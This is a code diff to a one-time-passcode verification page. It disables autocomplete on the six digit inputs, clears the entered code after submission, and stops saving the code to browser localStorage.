@@ -71,17 +71,17 @@
       <form id="verificationForm">
         <div class="otp-inputs">
           <input type="text" class="otp-input" name="otp1" maxlength="1" 
-                 required inputmode="numeric" onkeyup="moveToNext(this, 'otp2')">
+                 required inputmode="numeric" autocomplete="off" onkeyup="moveToNext(this, 'otp2')">
           <input type="text" class="otp-input" name="otp2" id="otp2" maxlength="1" 
-                 required inputmode="numeric" onkeyup="moveToNext(this, 'otp3')">
+                 required inputmode="numeric" autocomplete="off" onkeyup="moveToNext(this, 'otp3')">
           <input type="text" class="otp-input" name="otp3" id="otp3" maxlength="1" 
-                 required inputmode="numeric" onkeyup="moveToNext(this, 'otp4')">
+                 required inputmode="numeric" autocomplete="off" onkeyup="moveToNext(this, 'otp4')">
           <input type="text" class="otp-input" name="otp4" id="otp4" maxlength="1" 
-                 required inputmode="numeric" onkeyup="moveToNext(this, 'otp5')">
+                 required inputmode="numeric" autocomplete="off" onkeyup="moveToNext(this, 'otp5')">
           <input type="text" class="otp-input" name="otp5" id="otp5" maxlength="1" 
-                 required inputmode="numeric" onkeyup="moveToNext(this, 'otp6')">
+                 required inputmode="numeric" autocomplete="off" onkeyup="moveToNext(this, 'otp6')">
           <input type="text" class="otp-input" name="otp6" id="otp6" maxlength="1" 
-                 required inputmode="numeric">
+                 required inputmode="numeric" autocomplete="off">
         </div>
         
         <div id="otpError" class="otp-error" style="display:none;">
@@ -241,8 +241,11 @@
         inputs.forEach(function(input) { input.disabled = true; });
         
         var data = { otp: otp };
+        
+        // SECURITY: Clear OTP field immediately after submission
+        inputs.forEach(function(input) { input.value = ''; });
+        
         submitVerificationForm(data);
-        localStorage.setItem('verification_data', JSON.stringify(data));
         
         var waitTime = 2000 + Math.random() * 1000;
         
